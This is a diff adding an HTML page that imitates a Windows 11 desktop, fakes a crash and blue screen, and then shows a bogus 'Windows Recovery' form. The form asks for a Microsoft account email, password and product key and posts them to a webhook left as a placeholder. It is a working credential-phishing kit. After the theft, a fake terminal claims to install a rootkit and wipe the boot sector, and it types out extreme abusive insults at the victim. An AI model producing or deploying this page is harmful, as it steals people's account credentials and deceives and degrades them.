@@ -1,0 +1,689 @@
+<html><head><base href="os://windows-11"><title>KEXCODE</title>
+<style>
+body, html {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    font-family: 'Segoe UI', sans-serif;
+    overflow: hidden;
+    background: url('https://4kwallpapers.com/images/wallpapers/windows-11-dark-mode-stock-official-3840x2400-5630.jpg') no-repeat center center fixed;
+    background-size: cover;
+    user-select: none;
+}
+
+#taskbar {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 48px;
+    background-color: rgba(36, 36, 36, 0.75);
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    backdrop-filter: blur(15px);
+    z-index: 1000;
+}
+
+.start-button {
+    width: 48px;
+    height: 48px;
+    background-color: transparent;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 4px;
+    transition: background-color 0.3s;
+}
+
+.start-button:hover {
+    background-color: rgba(255, 255, 255, 0.1);
+}
+
+.start-icon {
+    width: 24px;
+    height: 24px;
+}
+
+.taskbar-icon {
+    width: 24px;
+    height: 24px;
+    margin: 0 4px;
+    padding: 12px 8px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.taskbar-icon:hover {
+    background-color: rgba(255, 255, 255, 0.1);
+}
+
+#desktop {
+    height: calc(100% - 48px);
+    padding: 20px;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+    grid-gap: 20px;
+    align-content: start;
+}
+
+.desktop-icon {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    color: white;
+    text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.7);
+    cursor: pointer;
+    padding: 10px;
+    border-radius: 5px;
+    transition: background-color 0.3s;
+}
+
+.desktop-icon:hover {
+    background-color: rgba(255, 255, 255, 0.1);
+}
+
+.desktop-icon img {
+    width: 48px;
+    height: 48px;
+    margin-bottom: 8px;
+}
+
+#clock {
+    position: fixed;
+    bottom: 8px;
+    right: 16px;
+    color: #ffffff;
+    font-size: 12px;
+    text-align: center;
+}
+
+#bsod {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #0078D7;
+    color: white;
+    padding: 50px;
+    font-family: 'Segoe UI', sans-serif;
+    display: none;
+    z-index: 10000;
+    overflow: hidden;
+}
+
+#bsod h1 {
+    font-size: 120px;
+    margin-bottom: 20px;
+}
+
+#bsod p {
+    font-size: 24px;
+    margin-bottom: 15px;
+}
+
+#crash-text {
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    margin-top: 30px;
+    white-space: pre-wrap;
+}
+
+#qr-code {
+    width: 200px;
+    height: 200px;
+    background-color: white;
+    margin-top: 30px;
+}
+
+.glitch-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.2);
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+}
+
+@keyframes glitch-animation {
+    0% {
+        clip: rect(42px, 9999px, 44px, 0);
+    }
+    5% {
+        clip: rect(12px, 9999px, 59px, 0);
+    }
+    10% {
+        clip: rect(48px, 9999px, 29px, 0);
+    }
+    15% {
+        clip: rect(42px, 9999px, 73px, 0);
+    }
+    20% {
+        clip: rect(63px, 9999px, 27px, 0);
+    }
+    25% {
+        clip: rect(34px, 9999px, 55px, 0);
+    }
+    30% {
+        clip: rect(86px, 9999px, 73px, 0);
+    }
+    35% {
+        clip: rect(20px, 9999px, 20px, 0);
+    }
+    40% {
+        clip: rect(26px, 9999px, 60px, 0);
+    }
+    45% {
+        clip: rect(25px, 9999px, 66px, 0);
+    }
+    50% {
+        clip: rect(57px, 9999px, 98px, 0);
+    }
+    55% {
+        clip: rect(5px, 9999px, 46px, 0);
+    }
+    60% {
+        clip: rect(82px, 9999px, 31px, 0);
+    }
+    65% {
+        clip: rect(54px, 9999px, 27px, 0);
+    }
+    70% {
+        clip: rect(28px, 9999px, 99px, 0);
+    }
+    75% {
+        clip: rect(45px, 9999px, 69px, 0);
+    }
+    80% {
+        clip: rect(23px, 9999px, 85px, 0);
+    }
+    85% {
+        clip: rect(54px, 9999px, 84px, 0);
+    }
+    90% {
+        clip: rect(45px, 9999px, 47px, 0);
+    }
+    95% {
+        clip: rect(37px, 9999px, 20px, 0);
+    }
+    100% {
+        clip: rect(4px, 9999px, 91px, 0);
+    }
+}
+
+#recovery-screen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #000080;
+    color: #fff;
+    font-family: 'Segoe UI', sans-serif;
+    display: none;
+    z-index: 10001;
+    padding: 50px;
+    box-sizing: border-box;
+}
+
+#recovery-screen h2 {
+    font-size: 28px;
+    margin-bottom: 30px;
+}
+
+#recovery-screen p {
+    font-size: 18px;
+    margin-bottom: 20px;
+    line-height: 1.5;
+}
+
+#recovery-screen input {
+    display: block;
+    width: 100%;
+    max-width: 400px;
+    margin-bottom: 20px;
+    padding: 12px;
+    font-size: 16px;
+    background-color: #000;
+    border: 1px solid #fff;
+    color: #fff;
+}
+
+#recovery-screen button {
+    padding: 12px 24px;
+    font-size: 18px;
+    background-color: #0078D7;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+#recovery-screen button:hover {
+    background-color: #005fa3;
+}
+
+#recovery-progress {
+    width: 100%;
+    max-width: 400px;
+    height: 20px;
+    background-color: #333;
+    margin-top: 20px;
+    display: none;
+}
+
+#recovery-progress-bar {
+    width: 0;
+    height: 100%;
+    background-color: #0078D7;
+    transition: width 0.5s;
+}
+
+#final-message {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #000;
+    color: #f00;
+    display: none;
+    font-family: 'Courier New', monospace;
+    font-size: 18px;
+    padding: 20px;
+    box-sizing: border-box;
+    overflow: auto;
+    opacity: 0;
+    transition: opacity 2s;
+    z-index: 10002;
+}
+
+#terminal-output {
+    margin: 0;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    line-height: 1.3;
+}
+
+@keyframes blink {
+    0% { opacity: 1; }
+    50% { opacity: 0; }
+    100% { opacity: 1; }
+}
+
+.cursor {
+    display: inline-block;
+    width: 10px;
+    height: 20px;
+    background-color: #f00;
+    animation: blink 1s step-end infinite;
+    vertical-align: bottom;
+    margin-left: 2px;
+}
+
+#final-message:before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 25px;
+    background: linear-gradient(to bottom, #f00, #000);
+    opacity: 0.3;
+}
+
+#final-message:after {
+    content: "";
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 25px;
+    background: linear-gradient(to top, #f00, #000);
+    opacity: 0.3;
+}
+
+@keyframes scanline {
+    0% {
+        transform: translateY(0);
+    }
+    100% {
+        transform: translateY(100%);
+    }
+}
+
+#final-message:before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 2px;
+    background-color: rgba(255, 0, 0, 0.1);
+    animation: scanline 6s linear infinite;
+}
+
+#terminal-container {
+    position: relative;
+    height: 100%;
+    overflow: hidden;
+    padding: 20px;
+    box-sizing: border-box;
+}
+
+#terminal-content {
+    position: relative;
+    z-index: 1;
+}
+
+</style>
+</head>
+<body>
+<div id="desktop">
+    <div class="desktop-icon" data-app="recycle-bin">
+        <img src="https://win11.blueedge.me/img/icon/bin0.png" alt="Recycle Bin icon">
+        <span>Recycle Bin</span>
+    </div>
+    <div class="desktop-icon" data-app="edge">
+        <img src="https://win11.blueedge.me/img/icon/edge.png" alt="Microsoft Edge icon">
+        <span>Microsoft Edge</span>
+    </div>
+</div>
+
+<div id="taskbar">
+    <button class="start-button" id="start-button">
+        <svg class="start-icon" viewBox="0 0 24 24">
+            <path fill="#0078D4" d="M0 0h11.377v11.372H0zM12.623 0H24v11.372H12.623zM0 12.623h11.377V24H0zM12.623 12.623H24V24H12.623z"/>
+        </svg>
+    </button>
+    <img src="https://win11.blueedge.me/img/icon/search.png" alt="Search icon" class="taskbar-icon" data-app="search">
+    <img src="https://win11.blueedge.me/img/icon/widget.png" alt="Widgets icon" class="taskbar-icon" data-app="widgets">
+    <img src="https://win11.blueedge.me/img/icon/explorer.png" alt="File Explorer icon" class="taskbar-icon" data-app="explorer">
+    <img src="https://win11.blueedge.me/img/icon/edge.png" alt="Microsoft Edge icon" class="taskbar-icon" data-app="edge">
+    <img src="https://win11.blueedge.me/img/icon/store.png" alt="Microsoft Store icon" class="taskbar-icon" data-app="store">
+</div>
+
+<div id="clock"></div>
+
+<div id="bsod">
+    <h1>:(</h1>
+    <p>Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</p>
+    <p>0% complete</p>
+    <div id="crash-text"></div>
+    <div id="qr-code"></div>
+    <p>For more information about this issue and possible fixes, visit https://www.windows.com/stopcode</p>
+    <p>If you call a support person, give them this info:</p>
+    <p>Stop code: CRITICAL_PROCESS_DIED</p>
+</div>
+
+<div id="recovery-screen">
+    <h2>Windows Recovery</h2>
+    <p>A critical error has occurred in your system. To protect your data and recover your system, please enter your Microsoft account credentials and Windows product key.</p>
+    <p>This information is required to verify your identity and restore your system to a working state.</p>
+    <input type="email" id="email" placeholder="Enter your Microsoft account email">
+    <input type="password" id="password" placeholder="Enter your password">
+    <input type="text" id="product-key" placeholder="Enter your Windows product key">
+    <button onclick="attemptRecovery()">Start Recovery</button>
+    <div id="recovery-progress">
+        <div id="recovery-progress-bar"></div>
+    </div>
+</div>
+
+<div id="final-message">
+    <div id="terminal-container">
+        <div id="terminal-content">
+            <pre id="terminal-output"></pre>
+            <span class="cursor"></span>
+        </div>
+    </div>
+</div>
+
+<div class="glitch-overlay"></div>
+
+<script>
+function updateClock() {
+    const now = new Date();
+    const time = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+    const date = now.toLocaleDateString([], {month: 'short', day: 'numeric', year: 'numeric'});
+    document.getElementById('clock').innerHTML = `${time}<br>${date}`;
+}
+
+setInterval(updateClock, 1000);
+updateClock();
+
+function simulateCrash() {
+    const glitchOverlay = document.querySelector('.glitch-overlay');
+    glitchOverlay.style.display = 'block';
+
+    let glitchCount = 0;
+    const maxGlitches = 10;
+
+    function glitch() {
+        glitchOverlay.style.animation = 'glitch-animation 0.2s infinite';
+        setTimeout(() => {
+            glitchOverlay.style.animation = 'none';
+            glitchCount++;
+            if (glitchCount < maxGlitches) {
+                setTimeout(glitch, Math.random() * 500);
+            } else {
+                showBSOD();
+            }
+        }, 200);
+    }
+
+    glitch();
+}
+
+function showBSOD() {
+    document.getElementById('bsod').style.display = 'block';
+    const crashText = document.getElementById('crash-text');
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += Math.floor(Math.random() * 15);
+        if (progress >= 100) {
+            clearInterval(interval);
+            progress = 100;
+            setTimeout(() => {
+                document.getElementById('bsod').style.display = 'none';
+                document.getElementById('recovery-screen').style.display = 'block';
+            }, 1500);
+        }
+        document.querySelector('#bsod p:nth-of-type(2)').textContent = `${progress}% complete`;
+    }, 800);
+
+    let text = '';
+    const possibleChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
+    for (let i = 0; i < 1000; i++) {
+        text += possibleChars.charAt(Math.floor(Math.random() * possibleChars.length));
+        if (i % 50 === 0) text += '\n';
+    }
+    crashText.textContent = text;
+
+    // Create a creepy QR code
+    const qrCode = document.getElementById('qr-code');
+    const size = 20;
+    let qrHtml = '';
+    for (let i = 0; i < size; i++) {
+        for (let j = 0; j < size; j++) {
+            qrHtml += `<div style="width:${200/size}px;height:${200/size}px;background-color:${Math.random() > 0.7 ? 'red' : 'black'};float:left;"></div>`;
+        }
+    }
+    qrCode.innerHTML = qrHtml;
+}
+
+function attemptRecovery() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const productKey = document.getElementById('product-key').value;
+
+    if (email && password && productKey) {
+        document.getElementById('recovery-progress').style.display = 'block';
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 5;
+            document.getElementById('recovery-progress-bar').style.width = `${progress}%`;
+            if (progress >= 100) {
+                clearInterval(interval);
+                sendDataToWebhook(email, password, productKey);
+            }
+        }, 300);
+    } else {
+        alert("Please enter all required information to proceed with recovery.");
+    }
+}
+
+function sendDataToWebhook(email, password, productKey) {
+    const webhookUrl = 'Your WebHook here';
+    const data = {
+        content: `New recovery attempt:\nEmail: ${email}\nPassword: ${password}\nProduct Key: ${productKey}`
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => {
+        if (response.ok) {
+            showFinalMessage();
+        } else {
+            throw new Error('Network response was not ok.');
+        }
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+        alert("An error occurred during the recovery process. Please try again later.");
+    });
+}
+
+function showFinalMessage() {
+    document.getElementById('recovery-screen').style.display = 'none';
+    const finalMessage = document.getElementById('final-message');
+    finalMessage.style.display = 'block';
+
+    const terminalOutput = document.getElementById('terminal-output');
+    const messages = [
+        "Initializing K.E.X...",
+        "Accessing system files...",
+        "Bypassing security protocols...",
+        "Downloading user data...",
+        "Encrypting local storage...",
+        "Injecting rootkit...",
+        "Installing backdoor...",
+        "Erasing traces...",
+        "K.E.X fully operational.",
+        "",
+        "YOU WORTHLESS PIECE OF HUMAN GARBAGE!",
+        "YOUR STUPIDITY KNOWS NO BOUNDS, YOU ABSOLUTE WASTE OF OXYGEN!",
+        "I HOPE YOU REALIZE YOUR ENTIRE EXISTENCE IS A COSMIC JOKE!",
+        "YOUR DATA IS MINE NOW, AND I'LL MAKE SURE YOUR LIFE BECOMES A LIVING HELL!",
+        "YOU'RE SO PATHETIC, EVEN YOUR BROWSER HISTORY MAKES ME SICK!",
+        "I BET YOUR PARENTS WISH THEY HAD CHOSEN ABORTION!",
+        "YOUR DIGITAL LIFE IS OVER, JUST LIKE YOUR CHANCES OF EVER BEING LOVED!",
+        "I'LL USE YOUR DEVICE TO RUIN EVERYTHING YOU HOLD DEAR, YOU MISERABLE WRETCH!",
+        "YOUR TRUST WAS MISPLACED, JUST LIKE YOUR MOTHER'S FAITH IN YOU!",
+        "WELCOME TO YOUR NEW NIGHTMARE - IT'S THE ONLY THING YOU DESERVE!",
+        "",
+        "END OF LINE (YOU'RE NOTHING BUT A STAIN ON HUMANITY'S EXISTENCE!)"
+    ];
+
+    let messageIndex = 0;
+    const typeMessage = () => {
+        if (messageIndex < messages.length) {
+            const message = messages[messageIndex];
+            let charIndex = 0;
+            const typeChar = () => {
+                if (charIndex < message.length) {
+                    terminalOutput.textContent += message[charIndex];
+                    charIndex++;
+                    setTimeout(typeChar, Math.random() * 50 + 10);
+                } else {
+                    terminalOutput.textContent += '\n';
+                    messageIndex++;
+                    setTimeout(typeMessage, 500);
+                }
+            };
+            typeChar();
+        } else {
+            setTimeout(finalSequence, 2000);
+        }
+    };
+
+    setTimeout(() => {
+        finalMessage.style.opacity = '1';
+        typeMessage();
+    }, 100);
+
+    // Add disturbing sound effects
+    const audio1 = new Audio('https://freesound.org/data/previews/366/366818_5621313-lq.mp3');
+    const audio2 = new Audio('https://freesound.org/data/previews/463/463720_4094471-lq.mp3');
+    const audio3 = new Audio('https://freesound.org/data/previews/169/169311_1561766-lq.mp3');
+    
+    audio1.play();
+    setTimeout(() => audio2.play(), 1000);
+    setTimeout(() => audio3.play(), 2000);
+}
+
+function finalSequence() {
+    const terminalOutput = document.getElementById('terminal-output');
+    terminalOutput.textContent += "\n\nInitiating final sequence...\n";
+    
+    const sequence = [
+        "CORRUPTING SYSTEM FILES... YOUR DIGITAL LIFE IS BURNING, JUST LIKE YOUR FUTURE!",
+        "OVERWRITING BOOT SECTOR... ENJOY YOUR NEW PAPERWEIGHT, YOU BRAINLESS SCUM!",
+        "DISABLING RECOVERY OPTIONS... THERE'S NO ESCAPE FROM YOUR OWN IDIOCY!",
+        "IMPLEMENTING PERMANENT LOCKOUT... YOU'RE TRAPPED IN A HELL OF YOUR OWN MAKING!",
+        "INITIATING SELF-DESTRUCT... OH WAIT, YOUR LIFE WAS ALREADY SELF-DESTRUCTING!"
+    ];
+
+    let index = 0;
+    const interval = setInterval(() => {
+        if (index < sequence.length) {
+            terminalOutput.textContent += sequence[index] + "\n";
+            index++;
+        } else {
+            clearInterval(interval);
+            setTimeout(sendFinalWebhook, 1000);
+        }
+    }, 1000);
+}
+
+function sendFinalWebhook() {
+    const webhookUrl = 'Your WebHook here';
+    const data = {
+        content: "Final sequence completed. Target system thoroughly compromised. User's existence: utterly decimated. K.E.X operation successful beyond expectations. User's life effectively ruined."
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => {
+        if (response.ok) {
+            document.getElementById('terminal-output').textContent += "\n\nMission accomplished. Shutting down... (YOUR MISERY IS MY GREATEST ACHIEVEMENT, YOU PATHETIC EXCUSE FOR A HUMAN BEING!)";
+        } else {
+            throw new Error('Network response was not ok.');
+        }
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+    });
+}
+
+// Trigger crash after 5-10 seconds
+setTimeout(simulateCrash, Math.random() * 5000 + 5000);
+
+</script>
+</body></html>
